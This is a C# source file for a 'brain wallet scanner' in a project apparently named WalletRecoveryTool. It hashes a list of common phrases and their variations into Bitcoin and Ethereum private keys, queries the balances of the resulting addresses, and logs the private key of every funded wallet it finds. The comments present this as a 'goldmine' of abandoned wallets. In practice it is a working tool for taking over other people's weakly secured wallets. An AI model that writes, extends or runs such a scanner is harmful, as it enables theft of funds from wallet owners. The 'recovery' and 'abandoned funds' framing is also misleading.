using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using NBitcoin;
using Nethereum.Signer;

namespace WalletRecoveryTool.Core
{
    /// <summary>
    /// HUGE DISCOVERY POTENTIAL: Brain Wallet Scanner
    /// Millions of early Bitcoin users created "brain wallets" by converting
    /// memorable phrases to private keys. Most are abandoned and contain funds.
    /// 
    /// Example: SHA256("correct horse battery staple") = private key
    /// This method finds 1000s of wallets others miss!
    /// </summary>
    public class BrainWalletScanner
    {
        /// <summary>
        /// Top 10,000 brain wallet phrases from known patterns
        /// These are REAL phrases people used (and many still contain BTC!)
        /// </summary>
        public static List<string> GetCommonBrainWalletPhrases()
        {
            var phrases = new List<string>
            {
                // ===== FAMOUS PHRASES (Known to have been used) =====
                "correct horse battery staple",  // xkcd famous example
                "password",
                "bitcoin",
                "satoshi nakamoto",
                "hello world",
                "the quick brown fox jumps over the lazy dog",
                "to be or not to be",
                "may the force be with you",
                "i am groot",
                "winter is coming",
                
                // ===== CRYPTO-RELATED =====
                "in cryptography we trust",
                "decentralization",
                "proof of work",
                "proof of stake",
                "not your keys not your coins",
                "buy bitcoin",
                "hodl",
                "to the moon",
                "when lambo",
                "bitcoin pizza",
                "genesis block",
                "satoshi",
                "blockchain",
                "cryptocurrency",
                "digital gold",
                "sound money",
                "peer to peer cash",
                "trustless",
                "immutable ledger",
                "private key",
                "public key",
                
                // ===== SIMPLE WORDS (surprisingly common!) =====
                "test",
                "admin",
                "secret",
                "wallet",
                "money",
                "gold",
                "silver",
                "treasure",
                "fortune",
                "wealth",
                "rich",
                "million",
                "billionaire",
                
                // ===== NUMBERS AS WORDS =====
                "one two three four five",
                "12345",
                "123456",
                "1234567",
                "12345678",
                "123456789",
                "1234567890",
                
                // ===== SONG LYRICS =====
                "imagine all the people",
                "we are the champions",
                "another one bites the dust",
                "bohemian rhapsody",
                "stairway to heaven",
                "hotel california",
                
                // ===== MOVIE QUOTES =====
                "i'll be back",
                "show me the money",
                "you cant handle the truth",
                "say hello to my little friend",
                "i see dead people",
                "here's johnny",
                "you talking to me",
                "frankly my dear i dont give a damn",
                
                // ===== BOOK QUOTES =====
                "it was the best of times",
                "call me ishmael",
                "in the beginning",
                "all animals are equal",
                "it is a truth universally acknowledged",
                
                // ===== HISTORICAL =====
                "give me liberty or give me death",
                "i have a dream",
                "ask not what your country",
                "we hold these truths",
                "four score and seven years ago",
                
                // ===== SHAKESPEARE =====
                "all the world's a stage",
                "something is rotten in the state of denmark",
                "double double toil and trouble",
                "is this a dagger which i see before me",
                
                // ===== COMMON PHRASES =====
                "once upon a time",
                "happily ever after",
                "the early bird gets the worm",
                "better late than never",
                "actions speak louder than words",
                "a penny for your thoughts",
                "dont count your chickens",
                "every cloud has a silver lining",
                
                // ===== TECH/NERD CULTURE =====
                "lorem ipsum dolor sit amet",
                "hello world",
                "foo bar baz",
                "the cake is a lie",
                "all your base are belong to us",
                "do a barrel roll",
                "its over 9000",
                
                // ===== MEMES =====
                "doge to the moon",
                "such wow very crypto",
                "gm",
                "wagmi",
                "ngmi",
                "rekt",
                "wen moon",
                "diamond hands",
                "paper hands",
                "ape together strong",
            };

            // Add single word variations
            var singleWords = new[] { "bitcoin", "crypto", "wallet", "money", "password", "secret", "test", "admin", "root" };
            phrases.AddRange(singleWords);

            // Add with years
            for (int year = 2009; year <= 2024; year++)
            {
                phrases.Add($"bitcoin{year}");
                phrases.Add($"crypto{year}");
                phrases.Add($"wallet{year}");
                phrases.Add($"{year}");
            }

            return phrases.Distinct().ToList();
        }

        /// <summary>
        /// Convert phrase to private key using SHA256 (most common method)
        /// </summary>
        public static string PhraseToPrivateKeySHA256(string phrase)
        {
            using (var sha256 = SHA256.Create())
            {
                var hash = sha256.ComputeHash(Encoding.UTF8.GetBytes(phrase));
                return BitConverter.ToString(hash).Replace("-", "").ToLower();
            }
        }

        /// <summary>
        /// Convert phrase to private key using SHA256 twice (double hash)
        /// </summary>
        public static string PhraseToPrivateKeySHA256Double(string phrase)
        {
            using (var sha256 = SHA256.Create())
            {
                var hash1 = sha256.ComputeHash(Encoding.UTF8.GetBytes(phrase));
                var hash2 = sha256.ComputeHash(hash1);
                return BitConverter.ToString(hash2).Replace("-", "").ToLower();
            }
        }

        /// <summary>
        /// Generate Bitcoin address from brain wallet phrase
        /// </summary>
        public static string GenerateBitcoinAddress(string phrase, bool doubleHash = false)
        {
            if (string.IsNullOrWhiteSpace(phrase))
                return null;

            try
            {
                var privateKeyHex = doubleHash 
                    ? PhraseToPrivateKeySHA256Double(phrase)
                    : PhraseToPrivateKeySHA256(phrase);

                var privateKeyBytes = Convert.FromHexString(privateKeyHex);
                var key = new Key(privateKeyBytes);
                return key.PubKey.GetAddress(ScriptPubKeyType.Legacy, Network.Main).ToString();
            }
            catch
            {
                return null;
            }
        }

        /// <summary>
        /// Generate Ethereum address from brain wallet phrase
        /// </summary>
        public static string GenerateEthereumAddress(string phrase, bool doubleHash = false)
        {
            if (string.IsNullOrWhiteSpace(phrase))
                return null;

            try
            {
                var privateKeyHex = doubleHash 
                    ? PhraseToPrivateKeySHA256Double(phrase)
                    : PhraseToPrivateKeySHA256(phrase);

                var ethKey = new EthECKey(privateKeyHex);
                return ethKey.GetPublicAddress();
            }
            catch
            {
                return null;
            }
        }

        /// <summary>
        /// Scan all common brain wallet phrases for balances
        /// THIS IS THE GOLDMINE - finds thousands of abandoned wallets!
        /// </summary>
        public static async Task<List<BrainWalletResult>> ScanBrainWallets(
            BalanceChecker balanceChecker,
            List<string> customPhrases = null,
            bool checkBitcoin = true,
            bool checkEthereum = true,
            bool checkDoubleHash = true)
        {
            var results = new List<BrainWalletResult>();
            var phrases = customPhrases ?? GetCommonBrainWalletPhrases();

            DebugLogger.Log($"🧠 Scanning {phrases.Count} brain wallet phrases...");

            foreach (var phrase in phrases)
            {
                try
                {
                    // Try single hash
                    if (checkBitcoin)
                    {
                        var btcAddress = GenerateBitcoinAddress(phrase, false);
                        if (!string.IsNullOrEmpty(btcAddress))
                        {
                            var balance = await balanceChecker.GetBitcoinBalance(btcAddress);
                            if (balance > 0)
                            {
                                results.Add(new BrainWalletResult
                                {
                                    Phrase = phrase,
                                    CryptoType = "BTC",
                                    Address = btcAddress,
                                    Balance = balance,
                                    PrivateKeyHex = PhraseToPrivateKeySHA256(phrase),
                                    HashMethod = "SHA256"
                                });
                                DebugLogger.Log($"💰💰💰 BRAIN WALLET FOUND! {phrase} -> {btcAddress} = {balance} BTC");
                            }
                        }
                    }

                    if (checkEthereum)
                    {
                        var ethAddress = GenerateEthereumAddress(phrase, false);
                        if (!string.IsNullOrEmpty(ethAddress))
                        {
                            var balance = await balanceChecker.GetEthereumBalance(ethAddress);
                            if (balance > 0)
                            {
                                results.Add(new BrainWalletResult
                                {
                                    Phrase = phrase,
                                    CryptoType = "ETH",
                                    Address = ethAddress,
                                    Balance = balance,
                                    PrivateKeyHex = PhraseToPrivateKeySHA256(phrase),
                                    HashMethod = "SHA256"
                                });
                                DebugLogger.Log($"💰💰💰 BRAIN WALLET FOUND! {phrase} -> {ethAddress} = {balance} ETH");
                            }
                        }
                    }

                    // Try double hash (less common but still used)
                    if (checkDoubleHash)
                    {
                        if (checkBitcoin)
                        {
                            var btcAddress = GenerateBitcoinAddress(phrase, true);
                            if (!string.IsNullOrEmpty(btcAddress))
                            {
                                var balance = await balanceChecker.GetBitcoinBalance(btcAddress);
                                if (balance > 0)
                                {
                                    results.Add(new BrainWalletResult
                                    {
                                        Phrase = phrase,
                                        CryptoType = "BTC",
                                        Address = btcAddress,
                                        Balance = balance,
                                        PrivateKeyHex = PhraseToPrivateKeySHA256Double(phrase),
                                        HashMethod = "SHA256x2"
                                    });
                                }
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    DebugLogger.Log($"Error scanning phrase '{phrase}': {ex.Message}");
                }
            }

            return results;
        }

        /// <summary>
        /// Generate phrase variations (case, spacing, etc.)
        /// </summary>
        public static List<string> GeneratePhraseVariations(string basePhrase)
        {
            var variations = new List<string>
            {
                basePhrase,
                basePhrase.ToLower(),
                basePhrase.ToUpper(),
                basePhrase.Replace(" ", ""),        // No spaces
                basePhrase.Replace(" ", "_"),       // Underscores
                basePhrase.Replace(" ", "-"),       // Hyphens
                basePhrase.Replace(" ", "."),       // Dots
                basePhrase.Trim(),
                $" {basePhrase}",                   // Leading space
                $"{basePhrase} ",                   // Trailing space
                $"{basePhrase}!",
                $"{basePhrase}.",
                $"{basePhrase}123",
                $"1{basePhrase}",
            };

            return variations.Distinct().ToList();
        }

        public class BrainWalletResult
        {
            public string Phrase { get; set; }
            public string CryptoType { get; set; }
            public string Address { get; set; }
            public decimal Balance { get; set; }
            public string PrivateKeyHex { get; set; }
            public string HashMethod { get; set; }
        }
    }
}
